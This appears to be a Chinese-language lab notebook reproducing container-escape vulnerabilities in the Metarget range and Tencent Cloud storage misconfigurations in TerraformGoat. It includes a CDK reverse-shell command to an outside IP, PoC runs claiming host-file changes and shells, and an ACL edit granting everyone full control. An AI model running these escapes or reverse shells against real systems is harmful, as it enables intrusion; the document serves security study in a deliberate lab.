# project01  漏洞复现                                                                             
一、start.......安装配置metarget靶场
1.拉取代码
root@VM-8-3-ubuntu:# git clone https://github.com/Metarget/metarget.git
2.切换目录
root@VM-8-3-ubuntu:# cd metarget/
3.安装依赖
root@VM-8-3-ubuntu:~/metarget# pip3 install -r requirements.txt
![image](https://github.com/user-attachments/assets/9ee7780c-38a3-484c-8455-34d2c8c8e46b)



## 1.	cve-2018-15664 容器逃逸
安装启动环境，查看版本
![image](https://github.com/user-attachments/assets/a224b3ec-36d2-40e3-b335-029301b82bee)
在这里找对应的POC，去做实验https://github.com/Metarget/cloud-native-security-book/tree/main
把poc放进metarget文件夹中，给两个执行文件（xx.sh为后缀）加上执行权限。如：chmod +x xxx.sh
![image](https://github.com/user-attachments/assets/973ded8d-b117-4464-a4fe-e9e978b4a96f)

![image](https://github.com/user-attachments/assets/9e5ec75d-bc5c-41bb-bbd2-c0411e270b83)

通过：执行命令
root@VM-8-3-ubuntu:~/metarget# ./run_write.sh 
FAILED -- HOST FILE UNCHANGED
Sending build context to Docker daemon  7.168kB
Step 1/11 : FROM opensuse/leap
Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)
Unable to find image 'cyphar/symlink_swap:latest' locally
docker: Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).
See 'docker run --help'.
SUCCESS -- HOST FILE CHANGED
即可触发漏洞，完成复现






2.	cve-2019-13139 命令执行（不行）










3.	cve-2019-14271 容器逃逸(不行)









4.	cve-2020-15257 容器逃逸
安装漏洞环境root@VM-8-3-ubuntu:~/metarget# sudo ./metarget cnv install cve-2020-15257
![image](https://github.com/user-attachments/assets/d1ced1be-4672-4a6a-ae32-0f5e32bc22e5)

查看docker版本，下载ubuntu:18.04
远程连接到容器内部并查看containerd-shim
![image](https://github.com/user-attachments/assets/6462fb9a-6a5d-4e15-925d-df9d3663bf78)

下载漏洞利用工具：https://github.com/cdk-team/CDK/releases/tag/v1.0.2
![image](https://github.com/user-attachments/assets/fb5ec1de-00c9-47eb-8f82-14bb19dd4c08)

使用docker cp目录复制到容器内部
root@VM-8-3-ubuntu:~/metarget# docker cp cdk_linux_amd64 fbf9212c0fe6:/
连接到容器
root@VM-8-3-ubuntu:~/metarget# sudo docker exec -it fbf9212c0fe6 /bin/bash
给执行权限给该cdk
root@VM-8-3-ubuntu:/# chmod +x cdk_linux_amd64 

使用该工具执行漏洞利用。
root@VM-8-3-ubuntu:/# ./cdk_linux_amd64 run shim-pwn reverse 43.138.22.133 80  
（可能存在8888端口安全组没打开的情况）使用80端口，即可
![image](https://github.com/user-attachments/assets/eb1e8fa1-54d5-4d2c-afdb-894f214a5734)

成功获取shell
![image](https://github.com/user-attachments/assets/3ef7cb7c-c7ca-4ac2-8cf0-5dd0e1a9670a)

5.	cve-2019-5736 容器逃逸
安装环境
./metarget cnv install cve-2019-5736
![image](https://github.com/user-attachments/assets/9adbfc34-ce5c-4d0b-b1f4-9b98efcad554)
查看版本
![image](https://github.com/user-attachments/assets/cb9180c1-253b-462f-ba88-5db1d21f4158)
POC链接：
https://github.com/Frichetten/CVE-2019-5736-PoC
下载main.go并上传到服务器，修改payload信息

![image](https://github.com/user-attachments/assets/0067a375-7bc7-4105-bd4f-c68b5c727ee2)


编译
![image](https://github.com/user-attachments/assets/efe4a640-936e-4d98-9553-4eb4647b918f)
启动Ubuntu18的容器
把编译的main文件cp进去
然后登录容器
添加权限
执行POC，即可拿到shell
![image](https://github.com/user-attachments/assets/bd03b3be-97e4-44e4-bac0-5dced1943040)
成功拿shell
![image](https://github.com/user-attachments/assets/fda071fd-3574-4024-aba3-b0480297bb02)



6.	cve-2019-16884 容器逃逸(不行)




7.	cve-2017-1002101 容器逃逸(不行)






8.	cve-2019-11253 拒绝服务（不行）



9.	cve-2019-9946 流量劫持





10.	cve-2020-8554 中间人攻击




11.	cve-2020-8559 权限提升（疑似需要k8s集群环境）




12.	k8s_backdoor_daemonset 持久化










































































































end


二、start.......TerraformGoat安装部署
root@VM-8-3-ubuntu:~# docker pull registry.cn-hongkong.aliyuncs.com/huoxian_pub/terraformgoat_tencentcloud:0.0.7
root@VM-8-3-ubuntu:~# docker run -itd --name terraformgoat_tencentcloud_0.0.7 registry.cn-hongkong.aliyuncs.com/huoxian_pub/terraformgoat_tencentcloud:0.0.7
root@VM-8-3-ubuntu:~# docker exec -it terraformgoat_tencentcloud_0.0.7 /bin/bash

![image](https://github.com/user-attachments/assets/0cdd859d-f68f-414e-94dd-fcee73a7a302)
部署完成

1.启动环境（对象遍历）
cd /TerraformGoat/tencentcloud/cos/bucket_object_traversal/

编辑文件vim terraform.tfvars
输入key和id，保存退出
输入命令：terraform init
terraform apply

![image](https://github.com/user-attachments/assets/c5451360-c506-44b3-baa3-058a2be911a7)

看到地址
![image](https://github.com/user-attachments/assets/3d0f2133-cb81-4817-9033-b0410256ca5c)

看到key

![image](https://github.com/user-attachments/assets/bf3e7381-0985-4108-a29d-02135ab0fa04)
添加key访问（可以看到已经有对应的对象被访问/下载）
![image](https://github.com/user-attachments/assets/969cb15f-26c5-4a00-a53f-b8caa7e158d5)

到此存储桶对象遍历漏洞复现完成
销毁漏洞环境：
![image](https://github.com/user-attachments/assets/c8011a92-a4a5-449b-a1a0-51554f95450f)

2.启动环境（任意文件上传）
切换目录
cd /TerraformGoat/tencentcloud/cos/unrestricted_file_upload/

输入密钥和id
vim terraform.tfvars
![image](https://github.com/user-attachments/assets/132fb4ff-6286-42ad-b934-bda4c63521ad)

部署运行
terraform init
terraform apply
可以看到链接
![image](https://github.com/user-attachments/assets/b37b2e12-57f5-4f0f-acb7-018698eb1371)

访问
![image](https://github.com/user-attachments/assets/f666b463-6ef1-4849-b3c4-bc098a297a97)

拼接照片名字，发现可以下载
![image](https://github.com/user-attachments/assets/87e61964-4d80-4b3e-9a96-6eae2856ae83)

现在可以通过PUT方法来覆盖这个文件（在bp中抓包修改方法，重新发包）
![image](https://github.com/user-attachments/assets/4a838295-f40d-451c-990f-7f67618c3132)

再次访问，发现照片是损坏的，这个就是覆盖成功的效果
![image](https://github.com/user-attachments/assets/22a2aee5-df7e-4c23-ab5a-3a4cec9f4113)

销毁环境完成
![image](https://github.com/user-attachments/assets/4da506c6-980b-4bc9-8d43-4f53d1bd1096)

3.公开访问
在容器中执行以下命令
cd /TerraformGoat/tencentcloud/cos/bucket_public_access
编辑 terraform.tfvars 文件，在文件中填入的tencentcloud_secret_id和tencentcloud_secret_key
vim terraform.tfvars
在腾讯云控制台的 API 密钥管理可以创建和查看您的 SecretID 和 SecretKey
部署靶场
terraform init
terraform apply
![image](https://github.com/user-attachments/assets/067a197d-d137-4f63-9000-88deb8ef4b1a)

![image](https://github.com/user-attachments/assets/003c9f33-f1cc-481c-828e-f14988671e03)

浏览器访问即可，公开访问是任意都可以访问
![image](https://github.com/user-attachments/assets/b6ae6f92-9970-4352-bfc9-1b29fe7fd47b)

销毁
![image](https://github.com/user-attachments/assets/9f496548-940a-49a4-a395-dc1bdea47f22)

4.ACL可写
这是一个用于构建腾讯云 COS Bucket ACL 可写的漏洞环境靶场。使用 Terraform 构建环境后，用户可以通过修改 Bucket 的 ACL 策略将原本无法访问的资源修改为可读，从而访问到 COS 服务资源。
环境搭建
在容器中执行以下命令
cd /TerraformGoat/tencentcloud/cos/bucket_acl_writable/
编辑 terraform.tfvars 文件，在文件中填入你的tencentcloud_secret_id和tencentcloud_secret_key
vim terraform.tfvars
在腾讯云控制台的 API 密钥管理可以创建和查看您的 SecretID 和 SecretKey
部署靶场
terraform init
terraform apply

![image](https://github.com/user-attachments/assets/3cdf6d7d-5504-4284-8570-1f39e3811171)

访问（被拒绝），拼接?acl，发现可以访问
![image](https://github.com/user-attachments/assets/7a9ece5d-1678-4f43-bdb2-376d5f5a2fc5)

原始：
<Grant>
<Grantee xsi:type="Group">
<URI>http://cam.qcloud.com/groups/global/AllUsers</URI>
</Grantee>
<Permission>WRITE_ACP</Permission>
</Grant>
<Grant>
<Grantee xsi:type="Group">
<URI>http://cam.qcloud.com/groups/global/AllUsers</URI>
</Grantee>
<Permission>READ_ACP</Permission>
</Grant>
新的
<Grant>
  <Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="Group">
    <URI>http://cam.qcloud.com/groups/global/AllUsers</URI>
  </Grantee>
  <Permission>FULL_CONTROL</Permission>
</Grant>
刷新，查看已经添加成功
![image](https://github.com/user-attachments/assets/633a2795-8cc2-4343-b075-7ad5c0771415)

![image](https://github.com/user-attachments/assets/2ff06ba5-100d-4609-a710-9434a6ff84b0)

摧毁
![image](https://github.com/user-attachments/assets/ce11f8a5-f03f-4a15-afac-0707860ffe53)


5.服务端加密未开启
这是一个用于构建腾讯云 COS Bucket 服务端加密未开启的场景。

场景搭建
在容器中执行以下命令

cd /TerraformGoat/tencentcloud/cos/server_side_encryption_disable
编辑 terraform.tfvars 文件，在文件中填入你的tencentcloud_secret_id和tencentcloud_secret_key

vim terraform.tfvars
在腾讯云控制台的 API 密钥管理可以创建和查看您的 SecretID 和 SecretKey

部署靶场

terraform init
![image](https://github.com/user-attachments/assets/402fa18c-0e3f-4914-8377-77c9e40c6b0d)

terraform apply
![image](https://github.com/user-attachments/assets/8e7fb71f-f953-4eb3-93d9-12ea27bb4a76)

打开，查看是未加密（照片）
![85eff7ba0ef95d7ad49f5340aaa7d32](https://github.com/user-attachments/assets/224b5bd8-6515-4178-b2c0-a1f145d51827)

销毁（照片）
![image](https://github.com/user-attachments/assets/ea222537-a88c-42fb-bf4c-7ea3df2e7913)

6.CVM SSRF  （x）








